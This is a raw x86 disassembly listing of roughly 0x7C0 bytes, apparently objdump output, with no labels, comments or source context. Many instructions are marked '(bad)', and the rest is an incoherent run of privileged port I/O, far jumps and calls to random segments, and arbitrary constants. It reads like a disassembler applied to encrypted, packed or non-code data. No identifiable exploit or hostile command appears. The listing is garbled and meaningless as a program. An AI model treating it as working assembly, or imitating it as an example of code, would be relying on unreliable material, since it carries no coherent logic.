  405f25:	outs   dx,DWORD PTR ds:[esi]
  405f26:	mov    ebx,0x18bbfe97
  405f2b:	push   ss
  405f2c:	mov    ah,0xa7
  405f2e:	add    al,0x7d
  405f30:	mov    ch,ch
  405f32:	push   edx
  405f33:	pcmpeqb mm4,QWORD PTR [eax-0x4c]
  405f37:	mov    cl,0xba
  405f39:	xchg   ebp,eax
  405f3a:	aam    0xa2
  405f3c:	pop    ebx
  405f3d:	push   DWORD PTR [esp+edi*8-0x67]
  405f41:	xor    edx,ebp
  405f43:	jo     0x405f9c
  405f45:	add    edx,ebp
  405f47:	or     eax,DWORD PTR [ecx-0x5380d6c5]
  405f4d:	jge    0x405fcb
  405f4f:	(bad)  
  405f50:	sbb    DWORD PTR fs:0xf19e21db,esp
  405f57:	repnz ficom DWORD PTR [edi+eax*8]
  405f5b:	pop    eax
  405f5c:	and    eax,ebx
  405f5e:	mov    cl,0xe1
  405f60:	mov    edx,0xc5f90900
  405f65:	jno    0x405f27
  405f67:	jo     0x405f97
  405f69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f6a:	dec    esi
  405f6b:	(bad)  [edx+0x8]
  405f6e:	lahf   
  405f6f:	scas   al,BYTE PTR es:[edi]
  405f70:	inc    esp
  405f71:	repz jge 0x405fdb
  405f74:	retf   0x9ddb
  405f77:	daa    
  405f78:	and    al,0x1e
  405f7a:	ins    BYTE PTR es:[edi],dx
  405f7b:	sub    eax,0xc4d19d3f
  405f80:	add    edi,DWORD PTR [ebp+0x62018a35]
  405f86:	ins    BYTE PTR es:[edi],dx
  405f87:	imul   ebp,DWORD PTR [esi+edx*8],0x1c8f4701
  405f8e:	jne    0x405f8a
  405f90:	loopne 0x405fb5
  405f92:	jle    0x405ff3
  405f94:	fisttp DWORD PTR fs:[esi-0x1]
  405f98:	stos   DWORD PTR es:[edi],eax
  405f99:	push   ds
  405f9a:	retf   0x8201
  405f9d:	fimul  DWORD PTR [eax]
  405f9f:	ror    DWORD PTR [esi],cl
  405fa1:	mov    ch,0x8c
  405fa3:	push   eax
  405fa4:	push   0x923196ac
  405fa9:	cmp    ah,cl
  405fab:	das    
  405fac:	pop    ss
  405fad:	xchg   ebp,eax
  405fae:	mov    esp,0x1083b406
  405fb3:	or     eax,0x249f5e6d
  405fb8:	mov    edx,0x74d22e4a
  405fbd:	lods   eax,DWORD PTR ds:[esi]
  405fbe:	xchg   BYTE PTR [edi],ch
  405fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fc1:	sub    al,0x94
  405fc3:	out    dx,al
  405fc4:	inc    eax
  405fc5:	inc    BYTE PTR [esi+0x61e8ac40]
  405fcb:	pop    es
  405fcc:	push   ss
  405fcd:	pop    ss
  405fce:	ficom  WORD PTR [edx]
  405fd0:	mov    ebp,0x978f962f
  405fd5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  405fd7:	or     DWORD PTR [edi-0x19108d82],esi
  405fdd:	or     al,0xdb
  405fdf:	push   0x77
  405fe1:	mov    ebp,0xb24df15c
  405fe6:	dec    esp
  405fe7:	adc    eax,0x1a79cd1f
  405fec:	aam    0x60
  405fee:	push   0x2f
  405ff0:	inc    ebp
  405ff1:	sbb    DWORD PTR [esi-0x203e4f33],0x7a
  405ff8:	jle    0x405ff0
  405ffa:	lods   al,BYTE PTR ds:[esi]
  405ffb:	or     eax,0xa898183f
  406000:	addr16 out dx,eax
  406002:	jbe    0x405ff6
  406004:	leave  
  406005:	leave  
  406006:	adc    eax,0xe8ec5725
  40600b:	out    dx,al
  40600c:	and    eax,0x481a4a5f
  406011:	pop    esp
  406012:	sbb    edx,ebx
  406014:	dec    edx
  406015:	sbb    BYTE PTR [ebp-0x29e327b],bl
  40601b:	add    eax,eax
  40601d:	push   esi
  40601e:	pushf  
  40601f:	inc    esi
  406020:	aaa    
  406021:	push   ecx
  406022:	inc    ebx
  406023:	test   al,0x1d
  406025:	jbe    0x406084
  406027:	sti    
  406028:	jg     0x40601a
  40602a:	sbb    DWORD PTR [ebx+0x25],esi
  40602d:	jbe    0x405fca
  40602f:	sbb    dh,BYTE PTR [esi+edx*2+0x6b]
  406033:	xor    al,0x3d
  406035:	or     cl,BYTE PTR [edx+eax*2]
  406038:	arpl   cx,dx
  40603a:	fldenv [edi]
  40603c:	mov    ch,0x35
  40603e:	push   edx
  40603f:	fiadd  DWORD PTR [edi+edx*8]
  406042:	adc    ch,0xec
  406045:	(bad)  
  406046:	xchg   edi,eax
  406047:	and    ebx,DWORD PTR [edx-0x10]
  40604a:	push   es
  40604b:	dec    esp
  40604c:	mov    esp,edi
  40604e:	sbb    BYTE PTR [eax-0x52],ch
  406051:	add    al,0xb4
  406053:	int    0xaa
  406055:	out    0x86,eax
  406057:	and    ebx,DWORD PTR [edi+ecx*8]
  40605a:	xor    al,0x23
  40605c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40605d:	mov    al,0xac
  40605f:	into   
  406060:	cmp    esi,DWORD PTR [esi+0x66]
  406063:	(bad)  
  406064:	lods   al,BYTE PTR ds:[esi]
  406065:	push   eax
  406066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406067:	or     esi,edi
  406069:	xchg   ebx,eax
  40606a:	jo     0x406045
  40606c:	xchg   ecx,eax
  40606d:	neg    BYTE PTR [edx+0x5863d67e]
  406073:	mov    ss,WORD PTR [ebx+eax*4-0x24]
  406077:	xor    bl,BYTE PTR [ebp-0x3e]
  40607a:	hlt    
  40607b:	add    DWORD PTR [eax+0x5d],eax
  40607e:	aam    0xe
  406080:	cwde   
  406081:	jno    0x4060e0
  406083:	inc    edi
  406084:	shr    DWORD PTR [ebx-0x67a6ac6a],1
  40608a:	cli    
  40608b:	or     DWORD PTR [esi+edi*8],0x707f1980
  406092:	xchg   edi,eax
  406093:	and    BYTE PTR [eax+ebp*8],dl
  406096:	fwait
  406097:	mov    edi,0xdd36595
  40609c:	popa   
  40609d:	(bad)  
  40609e:	xchg   esi,eax
  40609f:	call   0xf221:0x26610f81
  4060a6:	jae    0x4060bf
  4060a8:	(bad)  
  4060a9:	pusha  
  4060aa:	imul   esp,DWORD PTR [edx-0x28],0xffffffa5
  4060ae:	or     eax,esp
  4060b0:	pop    DWORD PTR [esi+0x3e]
  4060b3:	push   0x7b
  4060b5:	cmp    BYTE PTR [edi-0x21],dl
  4060b8:	lock aam 0xaf
  4060bb:	and    eax,0x3b1d0ba7
  4060c0:	jne    0x406048
  4060c2:	(bad)  
  4060c3:	mov    dl,0x33
  4060c5:	(bad)  
  4060c6:	and    edx,edx
  4060c8:	pop    ebx
  4060c9:	(bad)  
  4060cb:	out    dx,eax
  4060cc:	jo     0x406112
  4060ce:	xchg   edi,eax
  4060cf:	jnp    0x4060d8
  4060d1:	jecxz  0x4060f5
  4060d3:	xor    eax,ecx
  4060d5:	xor    eax,0x3ca1a5a2
  4060da:	or     bl,BYTE PTR [eax+ebx*1-0x17]
  4060de:	xor    al,0xd1
  4060e0:	aam    0xf9
  4060e2:	clc    
  4060e3:	aaa    
  4060e4:	cmp    DWORD PTR [ebx+0x2483d188],ebx
  4060ea:	push   ss
  4060eb:	add    al,0x15
  4060ed:	cmp    esi,DWORD PTR [eiz*8+0x507d44d0]
  4060f4:	xor    bh,ch
  4060f6:	pop    edi
  4060f7:	xchg   dh,dh
  4060f9:	popf   
  4060fa:	inc    ebp
  4060fb:	in     eax,dx
  4060fc:	sub    BYTE PTR [edi],0xa
  4060ff:	pop    esp
  406100:	and    esi,DWORD PTR [ebx+0x74]
  406103:	add    ebx,DWORD PTR [ebx]
  406105:	imul   esi,ebp,0xf8f762be
  40610b:	jge    0x406106
  40610d:	(bad)
  406110:	jecxz  0x406131
  406112:	adc    DWORD PTR [esi-0x4b],edx
  406115:	sbb    DWORD PTR [edi-0x316c494],0x9c5a5ad2
  40611f:	xchg   edx,eax
  406120:	xchg   edx,eax
  406121:	sbb    BYTE PTR [eax],dl
  406123:	fadd   DWORD PTR [edi]
  406125:	or     DWORD PTR [eax],0xffffffe7
  406128:	push   ebx
  406129:	sbb    BYTE PTR [ecx+0x2],0xeb
  40612d:	dec    eax
  40612e:	xchg   edx,eax
  40612f:	mov    ecx,0x217c5e6e
  406134:	jle    0x4060e1
  406136:	or     BYTE PTR [esi+edi*4-0x1],dh
  40613a:	xor    eax,0xe3d8c42e
  40613f:	fsub   DWORD PTR [edi+0x6b]
  406142:	push   0xffffffb7
  406144:	out    dx,al
  406145:	scas   eax,DWORD PTR es:[edi]
  406146:	mov    edi,0xfb3e1fcf
  40614b:	repz sbb ebx,DWORD PTR [ebp+0x62]
  40614f:	mov    cl,0x8e
  406151:	call   0x67338fdb
  406156:	mov    edi,DWORD PTR [esi+ebp*2+0x5b]
  40615a:	cmp    al,0x57
  40615c:	(bad)  
  40615d:	or     DWORD PTR [eax+0x2e4751d7],edi
  406163:	mov    ebx,0x2f262706
  406168:	mov    ds,ecx
  40616a:	xor    al,0x24
  40616c:	cmp    dh,BYTE PTR [edx]
  40616e:	cmp    al,0xc9
  406170:	(bad)  
  406171:	lods   eax,DWORD PTR ds:[esi]
  406172:	and    eax,0x6b8eda65
  406177:	xor    eax,0xc123a2d7
  40617c:	mov    al,0x6a
  40617e:	mov    DWORD PTR [edx+0x56],ebx
  406181:	xchg   ecx,eax
  406182:	scas   eax,DWORD PTR es:[edi]
  406183:	and    DWORD PTR [esi],eax
  406185:	int3   
  406186:	(bad)  
  406187:	sub    BYTE PTR [ebx],0xde
  40618a:	mov    ah,0x2d
  40618c:	out    dx,al
  40618d:	ret    
  40618e:	and    eax,0x28a15859
  406193:	scas   al,BYTE PTR es:[edi]
  406194:	cmp    ebp,DWORD PTR [edx+esi*1+0xca435dd]
  40619b:	push   0xfffffffb
  40619d:	mov    ch,0x10
  40619f:	data16 jbe 0x40612b
  4061a2:	jmp    0x406220
  4061a4:	test   al,0x1c
  4061a6:	bound  ebp,QWORD PTR [eax-0x24ca614f]
  4061ac:	jno    0x40618a
  4061ae:	stc    
  4061af:	cmp    eax,0x5965b861
  4061b4:	xchg   esp,eax
  4061b5:	inc    ebp
  4061b6:	out    0x39,eax
  4061b8:	scas   al,BYTE PTR es:[edi]
  4061b9:	jns    0x40615a
  4061bb:	shl    DWORD PTR [ecx],cl
  4061bd:	popa   
  4061be:	xor    bl,dh
  4061c0:	mov    al,0x77
  4061c2:	dec    dx
  4061c4:	(bad)  
  4061c5:	fild   WORD PTR [ecx+esi*2]
  4061c8:	cmp    BYTE PTR [eax],dh
  4061ca:	pop    eax
  4061cb:	mov    WORD PTR [edi-0x68],?
  4061ce:	mov    ah,0x88
  4061d0:	add    al,0x85
  4061d2:	push   es
  4061d3:	push   ecx
  4061d4:	xlat   BYTE PTR ds:[ebx]
  4061d5:	and    edi,ebx
  4061d7:	fisub  DWORD PTR [edx]
  4061d9:	xchg   edx,eax
  4061da:	jg     0x406254
  4061dc:	pop    ebx
  4061dd:	mov    bh,dh
  4061df:	push   0x4b7a47cb
  4061e4:	retf   
  4061e5:	leave  
  4061e6:	mov    cl,dh
  4061e8:	mov    ecx,DWORD PTR ds:0xfe79c03f
  4061ee:	ss js  0x40626c
  4061f1:	popf   
  4061f2:	push   ds
  4061f3:	push   cs
  4061f4:	mov    eax,0x6f7e606e
  4061f9:	mov    gs,WORD PTR [ebp-0x70]
  4061fc:	push   0xffffff91
  4061fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061ff:	adc    DWORD PTR [esi+0x73],edi
  406202:	and    cl,ch
  406204:	aas    
  406205:	jmp    DWORD PTR ss:[ecx+0x7]
  406209:	pop    esi
  40620a:	inc    edi
  40620b:	stos   DWORD PTR es:[edi],eax
  40620c:	xlat   BYTE PTR ds:[ebx]
  40620d:	dec    edi
  40620e:	mov    al,0xf6
  406210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406211:	int    0xa7
  406213:	xor    BYTE PTR [ecx+0x22],dl
  406216:	sub    BYTE PTR [edi],ah
  406218:	ret    0x24cd
  40621b:	daa    
  40621c:	retf   
  40621d:	pushf  
  40621e:	mov    dl,0x67
  406220:	sbb    bl,BYTE PTR [edx+0x2fbf5101]
  406226:	pop    edx
  406227:	or     eax,0x7ce25c5a
  40622c:	shl    DWORD PTR [eax-0x64],1
  40622f:	jg     0x406296
  406231:	les    esp,FWORD PTR [esi+0x5bee4020]
  406237:	add    BYTE PTR ss:[edi+0x1f],ah
  40623b:	mov    ecx,0x61896298
  406240:	into   
  406241:	lahf   
  406242:	xchg   ebp,eax
  406243:	dec    edi
  406244:	in     al,0x70
  406246:	retf   0x95dc
  406249:	mov    cl,0x16
  40624b:	cmp    BYTE PTR [eax-0x7a],dl
  40624e:	fdiv   QWORD PTR [esi-0x39]
  406251:	and    al,0xca
  406253:	lahf   
  406254:	xchg   DWORD PTR ds:0xd3d68f1,edi
  40625a:	xor    al,0xb1
  40625c:	cmc    
  40625d:	add    eax,0x371fcc39
  406262:	stc    
  406263:	ins    DWORD PTR es:[edi],dx
  406264:	rol    BYTE PTR [ecx-0xeef0fb1],0x9d
  40626b:	daa    
  40626c:	(bad)  [ebx-0x64537eaf]
  406272:	(bad)  
  406274:	out    dx,al
  406275:	jl     0x4062da
  406277:	jns    0x406289
  406279:	cmc    
  40627a:	sbb    eax,0x435cecb6
  40627f:	lods   al,BYTE PTR ds:[esi]
  406280:	xor    al,dl
  406282:	stos   DWORD PTR es:[edi],eax
  406283:	loopne 0x4062cc
  406285:	jne    0x40625b
  406287:	cmp    DWORD PTR [esi],0xd3e6c2eb
  40628d:	inc    ebx
  40628e:	push   ss
  40628f:	inc    eax
  406290:	test   BYTE PTR [ecx+0x47db1fcd],bl
  406296:	iret   
  406297:	fprem  
  406299:	das    
  40629a:	cmp    al,0x21
  40629c:	lea    edx,[eax-0x3f]
  40629f:	inc    edi
  4062a0:	adc    al,0xf5
  4062a2:	rcl    DWORD PTR [edx+0x42a931e9],cl
  4062a8:	test   DWORD PTR [ebx],edx
  4062aa:	mov    ds:0x45dd178c,eax
  4062af:	enter  0x4f12,0xcd
  4062b3:	add    al,0x2
  4062b5:	aam    0x4d
  4062b7:	neg    ebp
  4062b9:	arpl   bx,bx
  4062bb:	cld    
  4062bc:	pop    esi
  4062bd:	push   ds
  4062be:	jp     0x4062b5
  4062c0:	pushf  
  4062c1:	jno    0x4062fa
  4062c3:	xchg   DWORD PTR [ecx+0x325a960d],ecx
  4062c9:	xchg   DWORD PTR [ebp-0x2f],edx
  4062cc:	call   0x6fe16e22
  4062d1:	cmc    
  4062d2:	jl     0x40628c
  4062d4:	dec    ebp
  4062d5:	push   ecx
  4062d6:	fwait
  4062d7:	cwde   
  4062d8:	and    esi,DWORD PTR [eax]
  4062da:	push   DWORD PTR [esi+0x35ed6450]
  4062e0:	xchg   ebp,eax
  4062e1:	mov    ds:0x7b22d334,eax
  4062e6:	call   0x57db:0x30673f23
  4062ed:	mov    WORD PTR ds:[esi],?
  4062f0:	cmp    BYTE PTR [eax-0x59],bl
  4062f3:	and    ah,BYTE PTR [ecx-0x7e2b8ac3]
  4062f9:	sub    al,0xd6
  4062fb:	push   ebp
  4062fc:	push   esi
  4062fd:	inc    edi
  4062fe:	bound  edi,QWORD PTR ds:0xd0bbbd74
  406304:	mov    DWORD PTR [ecx-0x55],ecx
  406307:	icebp  
  406308:	mov    ds:0xd6fb276e,al
  40630d:	adc    eax,0xb457b669
  406312:	adc    eax,0x1f7036e6
  406317:	shl    ah,0x1
  40631a:	xor    ah,dl
  40631c:	adc    esp,ecx
  40631e:	test   DWORD PTR [ebx-0x55],edx
  406321:	or     eax,0x73e83c51
  406326:	sbb    BYTE PTR [edi],0xa8
  406329:	dec    esi
  40632a:	cmp    bl,BYTE PTR [edx]
  40632c:	inc    ebx
  40632d:	popf   
  40632e:	retf   
  40632f:	xchg   bx,ax
  406331:	inc    ebx
  406332:	das    
  406333:	sar    DWORD PTR [eax+0x2],0x42
  406337:	(bad)  
  406338:	mov    al,BYTE PTR [esi-0x432e7686]
  40633e:	js     0x406309
  406340:	sbb    BYTE PTR [ebx+0x7e],bl
  406343:	in     al,0xc4
  406345:	jns    0x40630c
  406347:	xchg   edi,eax
  406348:	pop    edi
  406349:	push   ss
  40634a:	iret   
  40634b:	pushf  
  40634c:	xor    DWORD PTR [edx],esp
  40634e:	lahf   
  40634f:	xchg   ebp,eax
  406350:	hlt    
  406351:	xor    eax,0x1db42c3a
  406356:	mov    ah,0xc8
  406358:	mov    esp,0xc858b005
  40635d:	jp     0x406372
  40635f:	adc    esp,ecx
  406361:	or     al,0x30
  406363:	jmp    0xc756:0x8f09425c
  40636a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40636b:	add    al,0x2
  40636d:	push   esp
  40636e:	add    cl,BYTE PTR [edx+edx*4-0x3935d682]
  406375:	mov    BYTE PTR es:[eax+0x6ae50d0b],ah
  40637c:	(bad)  
  40637d:	enter  0xff16,0xab
  406381:	rcr    BYTE PTR [ebx-0x1cf9d666],cl
  406387:	mov    ds:0x8e9eacf6,al
  40638c:	add    dl,BYTE PTR [eax]
  40638e:	js     0x406399
  406390:	jbe    0x406313
  406392:	push   eax
  406393:	inc    eax
  406394:	or     esi,DWORD PTR [ebp+0x36]
  406397:	cmp    edx,DWORD PTR [eax]
  406399:	sub    ch,BYTE PTR [edi+0x77dac1fb]
  40639f:	sahf   
  4063a0:	(bad)  
  4063a2:	fs xchg edi,eax
  4063a4:	fdiv   QWORD PTR [edx+ecx*2]
  4063a7:	push   eax
  4063a8:	and    esi,DWORD PTR [esi]
  4063aa:	popf   
  4063ab:	lods   al,BYTE PTR ds:[esi]
  4063ac:	loop   0x4063aa
  4063ae:	inc    eax
  4063af:	cld    
  4063b0:	mov    ah,0xb4
  4063b2:	push   ds
  4063b3:	mov    eax,0x935c2386
  4063b8:	ror    edi,1
  4063ba:	xorps  xmm1,XMMWORD PTR [eax+0x37288dd1]
  4063c1:	pop    ebx
  4063c2:	ds test ebx,esi
  4063c5:	ret    0x402c
  4063c8:	dec    edx
  4063c9:	lods   al,BYTE PTR ds:[esi]
  4063ca:	xchg   ebx,eax
  4063cb:	xchg   ecx,eax
  4063cc:	jl     0x40634e
  4063ce:	retf   0x75b6
  4063d1:	and    DWORD PTR ds:[edx+edx*8+0x74],edx
  4063d6:	and    BYTE PTR [esi-0x5d],al
  4063d9:	fld    st(0)
  4063db:	in     eax,0x4e
  4063dd:	cdq    
  4063de:	(bad)  
  4063df:	cmc    
  4063e0:	xor    BYTE PTR ds:0xe567ffed,bl
  4063e6:	pop    eax
  4063e7:	ror    BYTE PTR [eax-0x3322344e],cl
  4063ed:	jle    0x406400
  4063ef:	xchg   esp,eax
  4063f0:	cmp    BYTE PTR [ebx-0x380014f5],al
  4063f6:	inc    ebp
  4063f7:	(bad)  
  4063f8:	iret   
  4063f9:	add    DWORD PTR [esi+0x25],ebx
  4063fc:	cmp    eax,DWORD PTR ds:0x4b53447
  406402:	push   es
  406403:	jmp    0x4063cd
  406405:	sub    ch,cl
  406407:	mov    edx,0x8ce9d7c2
  40640c:	mov    DWORD PTR [ecx+0x4],esp
  40640f:	push   0x66
  406411:	pop    eax
  406412:	call   0xfd82bbd4
  406417:	loop   0x406436
  406419:	loopne 0x406494
  40641b:	cmp    cl,BYTE PTR ds:0x8894e8a7
  406421:	pop    es
  406422:	test   BYTE PTR [ebx],0x63
  406425:	mov    bl,BYTE PTR [esi+0x27]
  406428:	and    dl,0x68
  40642b:	cwde   
  40642c:	sub    dh,ah
  40642e:	mov    ah,0xe9
  406430:	in     eax,dx
  406431:	loop   0x4064ab
  406433:	int3   
  406434:	lock pop eax
  406437:	hlt    
  406438:	cmc    
  406439:	cmp    eax,0xd94a3317
  40643e:	cmp    ebp,DWORD PTR [ecx-0x10719343]
  406444:	cmp    BYTE PTR [ebx+0x2e],bl
  406447:	aad    0x14
  406449:	mov    eax,ds:0xa1818d1d
  40644e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40644f:	sub    dl,BYTE PTR [ebx+0x3e]
  406452:	pop    ecx
  406453:	push   cs
  406454:	push   eax
  406455:	repz xor eax,0xda6cea6
  40645b:	mov    edi,eax
  40645d:	push   edx
  40645e:	mov    eax,0x98089c44
  406463:	xchg   esp,eax
  406464:	test   al,0xa
  406466:	add    bh,cl
  406468:	cs ds lahf 
  40646b:	and    al,0xc6
  40646d:	idiv   DWORD PTR [esi+0x22517062]
  406473:	and    DWORD PTR [eax-0x50],ebp
  406476:	pusha  
  406477:	popf   
  406478:	loope  0x406458
  40647a:	jns    0x4064f3
  40647c:	cld    
  40647d:	mov    dh,0xcb
  40647f:	sub    al,0x53
  406481:	les    esi,FWORD PTR [edi]
  406483:	mov    eax,gs:0x5cfc6ade
  406489:	add    BYTE PTR [ecx],dl
  40648b:	sbb    eax,esi
  40648d:	adc    eax,0xc646b5a7
  406492:	xor    esi,DWORD PTR [eax]
  406494:	sub    BYTE PTR [esi+0x58],al
  406497:	or     ebp,0x6ad251d2
  40649d:	js     0x40645e
  40649f:	cmp    ch,BYTE PTR [eax+0x3a8d7a57]
  4064a5:	ret    0xf12f
  4064a8:	mov    ch,ch
  4064aa:	(bad)  
  4064ab:	and    al,0xc7
  4064ad:	fwait
  4064ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064af:	pop    esp
  4064b0:	or     al,0xd1
  4064b2:	inc    ebx
  4064b3:	dec    edx
  4064b4:	and    bl,dl
  4064b6:	in     eax,dx
  4064b7:	dec    eax
  4064b8:	dec    eax
  4064b9:	outs   dx,BYTE PTR ds:[esi]
  4064ba:	xor    DWORD PTR [ebx+edi*8-0x2958b19],ebp
  4064c1:	add    al,0x46
  4064c3:	inc    esp
  4064c4:	daa    
  4064c5:	inc    edi
  4064c6:	in     al,0x56
  4064c8:	jecxz  0x406464
  4064ca:	or     BYTE PTR [ecx-0x498a2b64],bl
  4064d0:	icebp  
  4064d1:	aas    
  4064d2:	ins    BYTE PTR es:[edi],dx
  4064d3:	mov    fs:0xaf61f4fa,eax
  4064d9:	xor    al,0xc2
  4064db:	jae    0x406479
  4064dd:	ror    DWORD PTR [edx-0x3c],cl
  4064e0:	(bad)  
  4064e1:	xchg   ecx,eax
  4064e2:	popf   
  4064e3:	aaa    
  4064e4:	retf   0x52f4
  4064e7:	add    BYTE PTR [edi],bh
  4064e9:	int    0xe9
  4064eb:	cli    
  4064ec:	sub    dl,BYTE PTR cs:[eax+eiz*2]
  4064f0:	push   ebx
  4064f1:	push   0xffffff89
  4064f3:	ja     0x4064f9
  4064f5:	ds (bad) 
  4064f7:	sub    BYTE PTR [eax],ah
  4064f9:	xor    BYTE PTR [edx+esi*8],ah
  4064fc:	jmp    0x56d4:0x88886760
  406503:	lods   eax,DWORD PTR ds:[esi]
  406504:	xchg   edx,eax
  406505:	test   al,0xf5
  406507:	add    al,0x15
  406509:	call   0x70a7776f
  40650e:	mov    esi,0x6e5d7fbf
  406513:	mov    edi,0xfd745450
  406518:	mov    al,ds:0x2ed88a0
  40651d:	mov    al,ds:0x755af5e4
  406522:	adc    BYTE PTR ds:0xe8b42905,0xee
  406529:	xlat   BYTE PTR ds:[ebx]
  40652a:	das    
  40652b:	retf   
  40652c:	(bad)  
  40652d:	lock inc eax
  40652f:	out    0xc6,al
  406531:	jmp    0x64dd:0x83f26c18
  406538:	arpl   ax,cx
  40653a:	adc    al,bh
  40653c:	inc    ebp
  40653d:	push   0xffffffce
  40653f:	jmp    0xda80:0x7bc37ff1
  406546:	inc    ecx
  406547:	ja     0x4065c4
  406549:	dec    esp
  40654a:	mov    edx,0x567b42a7
  40654f:	ret    0xec48
  406552:	hlt    
  406553:	add    BYTE PTR [edi+0x1358f8e8],0x87
  40655a:	fld    QWORD PTR [edi]
  40655c:	dec    ecx
  40655d:	dec    edi
  40655e:	pop    edx
  40655f:	ja     0x406517
  406561:	in     al,dx
  406562:	jmp    0x4065c1
  406564:	adc    BYTE PTR [ecx],al
  406566:	mov    eax,ds:0xae3950ac
  40656b:	sub    DWORD PTR [edi-0x15f4c89e],ebp
  406571:	dec    ebx
  406572:	mov    eax,0x7e58f05e
  406577:	outs   dx,DWORD PTR ds:[esi]
  406578:	cli    
  406579:	fsubr  QWORD PTR [ecx]
  40657b:	xchg   BYTE PTR [edx+0x22],dh
  40657e:	mov    ds:0xfd246383,al
  406583:	mov    ds:0x5dfb3375,al
  406588:	xor    al,dl
  40658a:	pop    esi
  40658b:	mov    cl,0xf0
  40658d:	and    dh,BYTE PTR ds:0x4847606
  406593:	nop
  406594:	push   cs
  406595:	aas    
  406596:	out    dx,eax
  406597:	in     al,dx
  406598:	jmp    0x2b468d19
  40659d:	mov    bl,0x13
  40659f:	pop    ds
  4065a0:	pop    ebp
  4065a1:	out    dx,al
  4065a2:	imul   esi,DWORD PTR [ecx+0x1d],0x6d
  4065a6:	pop    esp
  4065a7:	jmp    0x2ec52893
  4065ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065ad:	cmp    dh,al
  4065af:	fwait
  4065b0:	add    eax,0x1c260371
  4065b5:	push   eax
  4065b6:	push   es
  4065b7:	sbb    dh,BYTE PTR [ebp+0x5e]
  4065ba:	cwde   
  4065bb:	sar    DWORD PTR [edx-0x6e],0x8b
  4065bf:	imul   esp,DWORD PTR [eax-0x2],0x8a220ca6
  4065c6:	inc    ebx
  4065c7:	mov    gs,WORD PTR [esi+ebx*2+0x35]
  4065cb:	cmp    al,0x6e
  4065cd:	jo     0x4065ac
  4065cf:	dec    edi
  4065d0:	cmp    esi,DWORD PTR [ecx-0x4a]
  4065d3:	pusha  
  4065d4:	xlat   BYTE PTR fs:[ebx]
  4065d6:	jl     0x4065e3
  4065d8:	inc    esp
  4065d9:	xor    eax,0xeeca9274
  4065de:	sub    BYTE PTR [edx+0x5e],0x33
  4065e2:	add    dh,dh
  4065e4:	cmp    edx,DWORD PTR [esp+ebx*2+0x2d]
  4065e8:	jno    0x4065ac
  4065ea:	inc    ebx
  4065eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065ec:	(bad)  
  4065ee:	stc    
  4065ef:	jmp    0xb0d7eca8
  4065f4:	loope  0x4065a9
  4065f6:	cmp    eax,0x646ea475
  4065fb:	mov    al,ds:0xaae03dc7
  406600:	test   eax,0xb18c62c7
  406605:	adc    DWORD PTR [ebp+edi*1-0xd49b3ee],ecx
  40660c:	fwait
  40660d:	(bad)  
  40660e:	mov    ebx,0xd22af9c0
  406613:	or     ebp,ebp
  406615:	jge    0x4065c1
  406617:	xchg   ecx,eax
  406618:	adc    al,dl
  40661a:	shl    BYTE PTR [ecx],cl
  40661c:	push   0x9785937a
  406621:	fwait
  406622:	(bad)  
  406623:	mov    edi,0xb15b5cb8
  406628:	fwait
  406629:	sbb    DWORD PTR [eax-0x5ce40663],eax
  40662f:	jnp    0x4065da
  406631:	jecxz  0x40666b
  406633:	test   BYTE PTR [edi+ecx*8+0x2128c1e4],0xa9
  40663b:	mov    cl,0xf2
  40663d:	dec    ebp
  40663e:	mov    bh,0x7c
  406640:	pop    es
  406641:	cmp    DWORD PTR [esi+0x1cd243d6],0x38
  406648:	das    
  406649:	(bad)  
  40664a:	mov    BYTE PTR [esi+0x7ce54bc0],al
  406650:	jae    0x406670
  406652:	fsubr  st(1),st
  406654:	loope  0x406601
  406656:	ret    
  406657:	test   cl,0x9b
  40665a:	lock cmps WORD PTR ds:[esi],WORD PTR es:[edi]
  40665d:	jb     0x4066de
  40665f:	mov    ds:0x632b6b04,eax
  406664:	dec    edx
  406665:	mov    edx,0x387f4811
  40666a:	add    bl,BYTE PTR [edi-0x258a8495]
  406670:	scas   al,BYTE PTR es:[edi]
  406671:	addr16 adc esp,esi
  406674:	aad    0x21
  406676:	mov    dh,0x78
  406678:	cs (bad) 
  40667a:	xor    eax,0xf5bd4a1b
  40667f:	pop    ebp
  406680:	cmp    BYTE PTR [eax-0x5713f8a6],al
  406686:	dec    esp
  406687:	test   eax,0xf52490fb
  40668c:	jbe    0x4066c3
  40668e:	dec    esi
  40668f:	xchg   bh,al
  406691:	ins    DWORD PTR es:[edi],dx
  406692:	xchg   DWORD PTR [esi+eax*1+0x7d],edi
  406696:	jmp    0xc100d873
  40669b:	mov    ch,0xb
  40669d:	xor    DWORD PTR [edi+edx*1-0x43],eax
  4066a1:	hlt    
  4066a2:	push   ebp
  4066a3:	cmc    
  4066a4:	loop   0x4066af
  4066a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066a7:	hlt    
  4066a8:	or     al,0x3d
  4066aa:	out    0x9,al
  4066ac:	mov    dh,0xa0
  4066ae:	outs   dx,BYTE PTR ds:[esi]
  4066af:	(bad)  
  4066b0:	dec    ebp
  4066b1:	lock call 0xbcfa3a59
  4066b7:	xchg   BYTE PTR [ebp-0x55],bh
  4066ba:	fs pop ecx
  4066bc:	pop    ebx
  4066bd:	rcl    DWORD PTR [ecx],0x2f
  4066c0:	cmp    edx,DWORD PTR [edi+0x31]
  4066c3:	jge    0x4066be
  4066c5:	mov    ecx,0xd49c66d9
  4066ca:	cmp    dl,BYTE PTR [ebx]
  4066cc:	add    esi,ebp
  4066ce:	and    esp,0xffffffba
  4066d1:	pop    eax
  4066d2:	aam    0x8f
  4066d4:	sub    BYTE PTR [esi+0x363828c],dl
  4066da:	jg     0x4066b2
  4066dc:	adc    esp,ebx
  4066de:	out    0x83,eax
  4066e0:	pop    edx
  4066e1:	or     al,0xca
  4066e3:	clc    
  4066e4:	outs   dx,BYTE PTR ds:[esi]
  4066e5:	scas   eax,DWORD PTR es:[edi]
  4066e6:	adc    al,bh
